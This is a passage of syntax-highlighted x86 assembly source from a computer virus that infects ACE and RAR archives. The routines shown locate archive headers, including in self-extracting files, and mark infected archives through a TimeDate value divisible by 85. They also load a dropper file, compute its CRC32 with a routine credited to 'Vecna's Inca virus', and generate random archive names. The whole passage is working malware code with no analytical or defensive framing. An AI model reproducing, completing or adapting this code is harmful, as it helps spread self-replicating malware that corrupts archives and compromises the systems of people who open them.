        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc4">*</span><span class="sc5">ACE_header_needed</span><span class="sc0">    </span><span class="sc1">;size of header</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">               </span><span class="sc1">;read header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_read_length</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Test if archive file is infected if not generate new</span><span class="sc0">
        </span><span class="sc1">;number which is divided 85 and write its to esi</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   input:  esi=where i'll write TimeDate</span><span class="sc0">
        </span><span class="sc1">;   output: cf</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">__ar_is_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;TimeDate to eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;is divided 85 ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ar_ii_exit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03030302h</span><span class="sc0">       </span><span class="sc1">;set new TimeDate</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">archive_header_first</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;write new TimeDate</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">__ar_ii_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc1">;This function serves for find the starting header of archive ACE</span><span class="sc0">
    </span><span class="sc1">;or RAR. The archive is scanning from designate place to find out</span><span class="sc0">
    </span><span class="sc1">;the starting  header  of SFX files. In DOS' SFX is on some place</span><span class="sc0">
    </span><span class="sc1">;but in ACE-SFX is this border variable (in RAR-SFX not). Version</span><span class="sc0">
    </span><span class="sc1">;of ACE-SFX exists in English  and  German but their size is same</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc1">;   input:      none</span><span class="sc0">
    </span><span class="sc1">;   output:     cf=1 or EAX=CRC32 of file</span><span class="sc0">
    </span><span class="sc1">;               EBX=ACE_Archive or RAR_Archive</span><span class="sc0">
    </span><span class="sc1">;               EDI=header file pos</span><span class="sc0">
    </span><span class="sc1">;               file NOT closed</span><span class="sc0">
    </span><span class="sc1">;               dropper_memory is NOT deallocate</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">dropper_handle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;file handle of Archive_Filename</span><span class="sc0">
    </span><span class="sc5">dropper_memory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where is dropper placed ?</span><span class="sc0">
    </span><span class="sc5">dropper_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;size of a dropper</span><span class="sc0">
    </span><span class="sc5">header_filepos</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where's header ?</span><span class="sc0">
    </span><span class="sc5">where_magic</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where's magic of ACE/RAR archive ?</span><span class="sc0">
    </span><span class="sc5">dest_filepos</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;dest. file filepos</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">prepare_file</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Filename_Sz</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">pfile_exit</span><span class="sc0">      </span><span class="sc1">;is any file prepare ?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fopen</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">pfile_exit</span><span class="sc0">      </span><span class="sc1">;open file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Archive_BufSize</span><span class="sc0"> </span><span class="sc1">;allocate memory to</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">          </span><span class="sc1">;calculate CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Buffer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;but we have -6- places</span><span class="sc0">
    </span><span class="sc5">pfile_next_find</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">pfile_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_MagicWhere</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">pfile_magic_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;and how many bytes to read</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ecx=bytes to read</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;esi=file pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dest_filepos</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Buffer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">                   </span><span class="sc1">;i can't check error !</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Buffer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;prepare to scan</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">pfile_search_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;are we far then we can ?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">pfile_next_find</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_Magic</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;no, esi=RAR_Magic</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">RAR_MagicSize</span><span class="sc0">       </span><span class="sc1">;and his size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">pfile_search</span><span class="sc0">            </span><span class="sc1">;is it really RAR ?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACE_Magic</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;set esi=ACE_Magic</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ACE_MagicSize</span><span class="sc0">       </span><span class="sc1">;and his size</span><span class="sc0">
    </span><span class="sc5">pfile_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">           </span><span class="sc1">;compare magic</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pfile_search_again</span><span class="sc0">  </span><span class="sc1">;shit, we must search on other place</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;edi=place before magic</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">RAR_MagicSize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">pfile_read</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ACE_BeforeMagic</span><span class="sc4">+</span><span class="sc5">ACE_MagicSize</span><span class="sc4">-</span><span class="sc5">RAR_MagicSize</span><span class="sc0">
    </span><span class="sc5">pfile_read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dest_filepos</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">header_filepos</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;file pos of header !!</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fopen</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">pfile_exit</span><span class="sc0">      </span><span class="sc1">;nooooo, fucking jump !</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">100000b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;handle to ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fgetsize</span><span class="sc0">        </span><span class="sc1">;i know i can use Archive_Filename_Sz but it can be change !</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_size</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">          </span><span class="sc1">;eax=file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1000000b</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;edx=place in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_size</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;size of a file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">pfile_exit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_CRC32</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pfile_quit</span><span class="sc0">
    </span><span class="sc5">pfile_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">pfile_quit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">RAR_Archive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">pfile_RAR_quit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ACE_Archive</span><span class="sc0">
    </span><span class="sc5">pfile_RAR_quit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">header_filepos</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc1">;this code was extracted from Vecna's Inca virus, thx2Vecna</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">generate_CRC32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0edb8h</span><span class="sc0">
    </span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Number</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ACE_CRC</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">ACE_CRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc1">;input: edi=where put new name (maximum=8+1+3)</span><span class="sc0">
    </span><span class="sc1">;out:    al=filename length</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">generate_name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gen_archive_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">gen_archive_number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">name_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">name_found</span><span class="sc0">
